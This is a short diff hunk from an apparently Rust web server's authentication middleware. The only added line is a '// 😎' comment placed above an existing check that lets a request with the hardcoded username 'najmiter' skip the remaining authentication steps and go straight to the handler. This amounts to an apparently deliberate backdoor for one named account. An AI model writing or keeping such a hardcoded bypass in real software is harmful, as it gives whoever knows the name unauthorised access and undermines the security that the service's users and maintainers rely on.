@@ -30,6 +30,7 @@ async fn auth(mut req: Request<Body>, next: Next) -> Result<Response, StatusCode
         return Ok(response.into_response());
     }
 
+    // 😎
     if username == "najmiter" {
         return Ok(next.run(req).await);
     }
